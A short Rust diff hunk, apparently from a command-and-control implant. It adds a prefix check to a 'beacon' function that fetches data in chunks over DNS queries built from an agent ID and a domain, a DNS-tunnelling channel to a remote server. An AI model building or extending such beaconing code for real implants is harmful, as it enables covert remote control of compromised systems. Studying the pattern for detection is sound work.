@@ -302,6 +302,7 @@ pub fn beacon(server: &str, domain: &str, agent_id: &str) -> Option<Vec<u8>> {
         let mut parts = Vec::new();
         for i in 0..total {
             let r = dns_query(server, &format!("chunk.{}.{}.{}", i, agent_id, domain));
+            if !r.starts_with("chunk:") { return None; }
             parts.push(r.trim_start_matches("chunk:").to_string());
         }
         parts.join("")
